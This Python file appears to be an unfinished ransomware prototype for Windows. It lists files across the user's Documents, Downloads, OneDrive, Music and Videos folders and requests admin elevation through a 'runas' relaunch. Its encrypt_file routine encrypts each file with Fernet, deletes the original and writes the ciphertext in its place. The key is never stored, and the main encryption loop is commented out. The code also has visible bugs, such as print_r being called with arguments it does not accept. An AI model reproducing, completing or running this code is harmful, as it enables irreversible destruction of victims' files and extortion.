import base64
import ctypes
import hashlib
import os
import random
import re
import string
import subprocess
import sys
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC






def encrypt_file(file_path: str, F_key: Fernet):
    try_count = 0
    # READ FILE
    with open(file_path, 'rb') as ef:
        data = ef.read()

    # ENCRYPT
    data = F_key.encrypt(data)

    while os.path.isfile(file_path) or try_count <= 5:
        try:
            # DELETE
            os.remove(file_path)
            # REWRITE FILE
            with open(file_path, 'wb') as ef:
                print_r("rewrite", file_path)
                ef.write(data)
                break
        finally:
            try_count += 1

def print_r():
    pass
"""def encrypt_file(file_path,F_key):
    print_r(f'Encrypthing File : {file_path}')
    try:
         with open(file_path,'rb') as ef:
             data = ef.read()
             print_r('can oppen the data')
    except:
        print_r(f'can\'t oppen the file {file_path}')"""

# files = get_all_accessible()
"""for e in files:
    print_r(encrypt_file(e,cipher))"""


# print_r(f"The folder returned is : {files}")


# allow the program to call and receive powershell cmd
def powershell(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed



# Get all user specific informations
def get_user():
    # find the user
    user_dir = (str(powershell('ls ~').stdout).split())[2].replace('\\r', '').replace('\\n', '').replace('Mode','').replace('\\\\', '\\')
    special_folders = ['Music', 'Documents', 'OneDrive', 'Downloads', 'Videos']
    files = []
    unexplore_dir = []
    for e in special_folders:
        temp = os.listdir(f'{user_dir}\\{e}')
        for i in range(len(temp)):
            temp[i] = f'{user_dir}\\{e}\\{temp[i]}'
            if os.path.isfile(temp[i]):
                files.append(temp[i])
            else:
                unexplore_dir.append(temp[i])
    _try = 0
    while len(unexplore_dir) > 0:
        for e in unexplore_dir:
            try:
                temp = os.listdir(e)
                for i in range(len(temp)):
                    temp[i] = f'{e}\\{temp[i]}'
                    if os.path.isfile(temp[i]):
                        files.append(temp[i])
                    else:
                        unexplore_dir.append(temp[i])

                unexplore_dir.remove(e)
                _try = 0

            except:
                _try = _try + 1
                if _try > 2:
                    unexplore_dir.remove(e)
                    _try = 0
                continue
    return files

def is_admin() -> bool:
    '''
    :return: if the program is admin
    '''
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def all_files(start_path):
    '''
    :param start_path: path to look all of the children
    :return : all the computer files
    Save it in a TXT file
    '''
    with open('.\\folders.txt','w') as save:
        for root, dirs, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)
                print(file_path)
                save.write(str(f'{file_path}\n'))
            return files



def main():
    # Look if program is admin
    user_files : []
    files_all : []

    #if True:
    if is_admin():
        base = 'C:\\'
        t = [{'C:\\': []}]
        test = all_files()
        time.sleep(10)
        ''''input(f'next ?')
        print_r(files_all)
        own_dir = os.getcwd()  # get is own directory to not encrypt itself
        key = Fernet.generate_key()  # key generator
        cipher = Fernet(key)  # hash the key
        #for e in files:
        #   if e is not own_dir:
        #        encrypt_file(e, cipher)  # the file it receive'''
    else:
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    input('its over')


if __name__ == "__main__":
    main()
